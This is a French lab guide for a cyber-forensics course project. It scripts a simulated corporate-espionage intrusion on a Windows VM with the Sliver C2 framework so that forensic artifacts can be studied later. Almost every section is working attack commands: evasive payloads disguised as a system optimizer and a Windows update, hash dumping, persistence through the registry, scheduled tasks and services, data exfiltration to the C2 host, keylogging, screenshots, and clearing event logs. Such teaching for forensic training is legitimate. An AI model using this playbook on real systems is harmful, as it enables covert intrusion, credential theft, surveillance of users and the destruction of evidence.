# PROJET M1 - Scénarios d'Attaque Post-Exploitation
## Guide Détaillé de Simulation avec Silver C2

### 🎯 Objectif de la Simulation
Créer une attaque post-exploitation réaliste qui génère des artefacts exploitables pour l'investigation forensique, en utilisant Silver C2 pour démontrer :
- Les techniques de persistance
- Le mouvement latéral
- L'exfiltration de données
- Les traces laissées en mémoire et sur disque

---

## 📋 Vue d'Ensemble des Scénarios

### Scénario Principal : "Corporate Espionage"
**Contexte** : Un attaquant a obtenu un accès initial sur un poste de travail Windows 10 d'un employé et souhaite :
1. Établir une persistance
2. Collecter des informations sensibles
3. Exfiltrer des données
4. Maintenir l'accès pour des opérations futures

### Timeline de l'Attaque
```
T+00:00 - Génération et livraison du payload initial
T+00:05 - Établissement de la connexion C2
T+00:10 - Reconnaissance système
T+00:20 - Élévation de privilèges
T+00:30 - Installation de persistance
T+00:45 - Collecte d'informations
T+01:00 - Exfiltration de données
T+01:15 - Nettoyage partiel et maintien d'accès
```

---

## 🚀 Phase 1 : Accès Initial et Reconnaissance

### Étape 1.1 : Génération du Payload Initial
```bash
# Sur VM1 (Kali)
sliver-client

# Générer un payload déguisé en outil légitime
sliver > generate --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format exe \
    --skip-symbols --evasion \
    --save ~/project-m1/payloads/SystemOptimizer.exe

# Créer un payload de secours (DLL)
sliver > generate --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format shared \
    --skip-symbols --evasion \
    --save ~/project-m1/payloads/msvcr120.dll
```

### Étape 1.2 : Simulation de Livraison
```bash
# Copier le payload vers VM2 (simuler email/USB)
# Méthodes possibles :
# 1. Partage réseau temporaire
# 2. Serveur HTTP simple
# 3. Copie directe (pour simulation)

# Démarrer un serveur HTTP sur VM1
cd ~/project-m1/payloads/
python3 -m http.server 8000

# Log de l'action
echo "[$(date)] Payload SystemOptimizer.exe généré et servi via HTTP:8000" >> ~/project-m1/logs/attack-timeline.log
```

### Étape 1.3 : Exécution Initiale sur VM2
```powershell
# Sur VM2 (Windows 10)
# Télécharger le payload (simuler action utilisateur)
Invoke-WebRequest -Uri "http://192.168.56.10:8000/SystemOptimizer.exe" -OutFile "C:\Users\$env:USERNAME\Downloads\SystemOptimizer.exe"

# Exécuter le payload
& "C:\Users\$env:USERNAME\Downloads\SystemOptimizer.exe"
```

### Étape 1.4 : Vérification de la Connexion
```bash
# Sur VM1 (Kali) - Console Silver
sliver > sessions

# Sélectionner la session active
sliver > use <session-name>

# Première reconnaissance
sliver (session_name) > info
sliver (session_name) > whoami
sliver (session_name) > pwd
sliver (session_name) > getpid
```

---

## 🔍 Phase 2 : Reconnaissance Système

### Étape 2.1 : Collecte d'Informations Système
```bash
# Dans la session Silver
sliver (session) > info
sliver (session) > ps
sliver (session) > netstat
sliver (session) > ifconfig

# Énumération des utilisateurs
sliver (session) > execute "net user"
sliver (session) > execute "net localgroup administrators"

# Informations système détaillées
sliver (session) > execute "systeminfo"
sliver (session) > execute "wmic os get name,version,architecture"
```

### Étape 2.2 : Découverte du Réseau
```bash
# Scanner le réseau local
sliver (session) > execute "arp -a"
sliver (session) > execute "ipconfig /all"

# Découverte des partages réseau
sliver (session) > execute "net view"
sliver (session) > execute "net share"
```

### Étape 2.3 : Recherche de Fichiers Sensibles
```bash
# Rechercher des fichiers intéressants
sliver (session) > execute "dir C:\Users\%USERNAME%\Documents\*.pdf /s"
sliver (session) > execute "dir C:\Users\%USERNAME%\Desktop\*.txt /s"

# Rechercher des mots-clés sensibles
sliver (session) > execute "findstr /s /i \"password\" C:\Users\%USERNAME%\Documents\*.*"
sliver (session) > execute "findstr /s /i \"confidential\" C:\Users\%USERNAME%\Documents\*.*"
```

---

## 🔓 Phase 3 : Élévation de Privilèges

### Étape 3.1 : Tentatives d'Élévation Automatique
```bash
# Utiliser les capacités Silver
sliver (session) > getsystem

# Si échec, énumérer les privilèges
sliver (session) > getprivs
sliver (session) > execute "whoami /priv"
```

### Étape 3.2 : Injection de Processus (si nécessaire)
```bash
# Lister les processus avec privilèges élevés
sliver (session) > ps

# Identifier un processus cible (ex: explorer.exe)
sliver (session) > migrate <PID_explorer>

# Vérifier l'élévation
sliver (session) > whoami
sliver (session) > getprivs
```

### Étape 3.3 : Dump des Credentials
```bash
# Tentative de dump des hashes
sliver (session) > hashdump

# Recherche de credentials dans la mémoire (si possible)
sliver (session) > execute "reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

---

## 🔄 Phase 4 : Établissement de Persistance

### Étape 4.1 : Persistance via Registre
```bash
# Copier le payload dans un emplacement permanent
sliver (session) > upload ~/project-m1/payloads/SystemOptimizer.exe "C:\Windows\System32\OptimizationService.exe"

# Créer une entrée de registre
sliver (session) > execute "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OptimizationService /t REG_SZ /d C:\Windows\System32\OptimizationService.exe /f"
```

### Étape 4.2 : Persistance via Tâche Programmée
```bash
# Créer une tâche programmée
sliver (session) > execute "schtasks /create /tn \"System Optimization\" /tr \"C:\Windows\System32\OptimizationService.exe\" /sc onlogon /f"

# Vérifier la tâche créée
sliver (session) > execute "schtasks /query /tn \"System Optimization\""
```

### Étape 4.3 : Persistance via Service Windows
```bash
# Créer un service Windows (nécessite privilèges administrateur)
sliver (session) > execute "sc create OptimizationSvc binPath= \"C:\Windows\System32\OptimizationService.exe\" start= auto"
sliver (session) > execute "sc description OptimizationSvc \"System Optimization Background Service\""

# Démarrer le service
sliver (session) > execute "sc start OptimizationSvc"
```

---

## 📊 Phase 5 : Collecte et Exfiltration de Données

### Étape 5.1 : Création de Répertoires de Staging
```bash
# Créer un répertoire de travail caché
sliver (session) > execute "mkdir C:\Windows\Temp\.system"
sliver (session) > execute "attrib +h C:\Windows\Temp\.system"
```

### Étape 5.2 : Collecte de Fichiers Sensibles
```bash
# Copier des documents utilisateur
sliver (session) > execute "copy \"C:\Users\%USERNAME%\Documents\*.pdf\" \"C:\Windows\Temp\.system\""
sliver (session) > execute "copy \"C:\Users\%USERNAME%\Desktop\*.txt\" \"C:\Windows\Temp\.system\""

# Créer un fichier de credentials factice
sliver (session) > execute "echo admin:P@ssw0rd123 > C:\Windows\Temp\.system\saved_passwords.txt"
sliver (session) > execute "echo backup_key=ABC123-DEF456-789GHI >> C:\Windows\Temp\.system\saved_passwords.txt"
```

### Étape 5.3 : Collecte d'Informations Système
```bash
# Sauvegarder la configuration système
sliver (session) > execute "systeminfo > C:\Windows\Temp\.system\system_info.txt"
sliver (session) > execute "ipconfig /all > C:\Windows\Temp\.system\network_config.txt"
sliver (session) > execute "net user > C:\Windows\Temp\.system\users.txt"

# Historique des commandes
sliver (session) > execute "doskey /history > C:\Windows\Temp\.system\command_history.txt"
```

### Étape 5.4 : Compression et Exfiltration
```bash
# Compresser les données collectées
sliver (session) > execute "powershell Compress-Archive -Path 'C:\Windows\Temp\.system\*' -DestinationPath 'C:\Windows\Temp\.system\collected_data.zip'"

# Exfiltrer via Silver
sliver (session) > download "C:\Windows\Temp\.system\collected_data.zip" ~/project-m1/evidence/exfiltrated_data.zip

# Exfiltration alternative via HTTP POST (simulation)
sliver (session) > execute "powershell Invoke-WebRequest -Uri 'http://192.168.56.10:8000/upload' -Method POST -InFile 'C:\Windows\Temp\.system\collected_data.zip'"
```

---

## 🕵️ Phase 6 : Actions de Surveillance Avancées

### Étape 6.1 : Capture de Frappes (Keylogger)
```bash
# Démarrer le keylogger Silver
sliver (session) > keylogger start

# Laisser fonctionner quelques minutes
sleep 300

# Récupérer les frappes
sliver (session) > keylogger dump
sliver (session) > keylogger stop
```

### Étape 6.2 : Captures d'Écran
```bash
# Prendre des captures d'écran périodiques
sliver (session) > screenshot
sleep 60
sliver (session) > screenshot
sleep 60
sliver (session) > screenshot
```

### Étape 6.3 : Monitoring des Processus
```bash
# Surveiller les nouveaux processus
sliver (session) > ps

# Créer un script de monitoring
sliver (session) > execute "echo @echo off > C:\Windows\Temp\.system\monitor.bat"
sliver (session) > execute "echo :loop >> C:\Windows\Temp\.system\monitor.bat"
sliver (session) > execute "echo tasklist >> C:\Windows\Temp\.system\processes.log >> C:\Windows\Temp\.system\monitor.bat"
sliver (session) > execute "echo timeout /t 60 >> C:\Windows\Temp\.system\monitor.bat"
sliver (session) > execute "echo goto loop >> C:\Windows\Temp\.system\monitor.bat"
```

---

## 🧹 Phase 7 : Nettoyage Partiel et Maintien d'Accès

### Étape 7.1 : Suppression des Traces Évidentes
```bash
# Supprimer les fichiers temporaires (mais pas tous)
sliver (session) > execute "del C:\Windows\Temp\.system\*.txt"
sliver (session) > execute "del C:\Windows\Temp\.system\*.log"

# Garder le payload principal et les mécanismes de persistance
# Ne pas supprimer : OptimizationService.exe, tâches programmées, services
```

### Étape 7.2 : Nettoyage des Logs Système (Partiel)
```bash
# Nettoyer partiellement les logs Windows
sliver (session) > execute "wevtutil cl Application"
sliver (session) > execute "wevtutil cl System"

# Laisser intentionnellement certains logs pour l'investigation
# Ne pas nettoyer Security logs (plus suspicieux)
```

### Étape 7.3 : Établissement d'un Accès de Secours
```bash
# Créer un beacon avec intervalle plus long
sliver > generate beacon --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format exe \
    --jitter 60s --interval 3600s \
    --skip-symbols --evasion \
    --save ~/project-m1/payloads/backup_beacon.exe

# Installer le beacon de secours
sliver (session) > upload ~/project-m1/payloads/backup_beacon.exe "C:\Windows\System32\WinUpdate.exe"
sliver (session) > execute "schtasks /create /tn \"Windows Update Check\" /tr \"C:\Windows\System32\WinUpdate.exe\" /sc daily /st 14:00 /f"
```

---

## 📈 Phase 8 : Génération d'Artefacts pour l'Investigation

### Étape 8.1 : Création d'Artefacts Mémoire
```bash
# Activités qui laissent des traces en mémoire
sliver (session) > execute "powershell Get-Process | Out-String"
sliver (session) > execute "netstat -an"

# Connexions réseau actives vers le C2
# Les connexions Silver restent actives pour analyse
```

### Étape 8.2 : Création d'Artefacts Disque
```bash
# Créer des fichiers avec métadonnées intéressantes
sliver (session) > execute "echo Sensitive Corporate Data > C:\Users\%USERNAME%\Documents\corporate_secrets.txt"
sliver (session) > execute "echo [BACKDOOR] Malicious payload executed successfully > C:\Windows\Temp\install.log"

# Modifier des registres pour laisser des traces
sliver (session) > execute "reg add HKCU\Software\AttackerTools /v LastRun /t REG_SZ /d \"%date% %time%\" /f"
```

### Étape 8.3 : Maintien de l'Activité
```bash
# Maintenir quelques connexions actives
sliver (session) > execute "ping -t 192.168.56.10" &

# Laisser le processus Silver actif pour capture mémoire
# Ne pas fermer la session principale
```

---

## 📋 Logging et Documentation de l'Attaque

### Timeline Complète de l'Attaque
```bash
# Script de logging automatique
cat > ~/project-m1/logs/attack-timeline.log << EOF
[T+00:00] Payload SystemOptimizer.exe généré
[T+00:02] Payload servi via HTTP sur port 8000
[T+00:05] Connexion Silver C2 établie depuis 192.168.56.20
[T+00:06] Reconnaissance système initiée
[T+00:10] Énumération des utilisateurs et privilèges
[T+00:15] Tentative d'élévation de privilèges
[T+00:20] Migration vers processus explorer.exe
[T+00:25] Persistance établie via registre HKCU\Run
[T+00:30] Tâche programmée "System Optimization" créée
[T+00:35] Service OptimizationSvc installé
[T+00:40] Collecte de fichiers utilisateur initiée
[T+00:45] Création du répertoire de staging C:\Windows\Temp\.system
[T+00:50] Compression des données collectées
[T+00:55] Exfiltration de collected_data.zip (2.3 MB)
[T+01:00] Keylogger activé pendant 5 minutes
[T+01:05] 3 captures d'écran prises
[T+01:10] Nettoyage partiel des logs Application et System
[T+01:15] Beacon de secours WinUpdate.exe installé
[T+01:20] Session maintenue active pour investigation
EOF
```

### Artefacts Créés pour l'Investigation
```bash
# Documenter tous les artefacts créés
cat > ~/project-m1/evidence/artifacts-created.txt << EOF
=== ARTEFACTS CRÉÉS POUR L'INVESTIGATION ===

Fichiers sur VM2 (Windows):
- C:\Users\%USERNAME%\Downloads\SystemOptimizer.exe (payload initial)
- C:\Windows\System32\OptimizationService.exe (persistance)
- C:\Windows\System32\WinUpdate.exe (beacon de secours)
- C:\Windows\Temp\.system\collected_data.zip (données exfiltrées)
- C:\Windows\Temp\install.log (log malveillant)
- C:\Users\%USERNAME%\Documents\corporate_secrets.txt (données factices)

Registre Windows:
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OptimizationService
- HKCU\Software\AttackerTools\LastRun

Tâches Programmées:
- "System Optimization" (démarrage à la connexion)
- "Windows Update Check" (quotidien 14:00)

Services Windows:
- OptimizationSvc (démarrage automatique)

Connexions Réseau:
- 192.168.56.20:443 -> 192.168.56.10:8080 (HTTP C2)
- 192.168.56.20:443 -> 192.168.56.10:8443 (HTTPS C2)

Processus Actifs:
- SystemOptimizer.exe (PID variable)
- OptimizationService.exe (PID variable)

Logs Modifiés:
- Application Log (nettoyé)
- System Log (nettoyé)
- Security Log (intact pour investigation)
EOF
```

---

## 🎯 Points Clés pour l'Investigation Forensique

### Traces Intentionnellement Laissées
1. **Processus actifs** : Payload Silver toujours en cours d'exécution
2. **Connexions réseau** : Communications C2 actives
3. **Fichiers sur disque** : Payloads et artefacts conservés
4. **Registre** : Clés de persistance intactes
5. **Memory dumps** : Structures Silver présentes en mémoire
6. **Logs Security** : Non nettoyés pour analyse

### Techniques de Détection Attendues
1. **Volatility** : Détection des processus malveillants en mémoire
2. **Autopsy** : Analyse des fichiers et timeline
3. **Sleuth Kit** : Récupération de fichiers supprimés
4. **Belkasoft** : Extraction d'artefacts mémoire et disque

---

**Prochaine étape** : Guide d'investigation forensique avec tous les outils mentionnés.

---

*Scénarios d'Attaque pour Projet M1 - Cyber Forensics*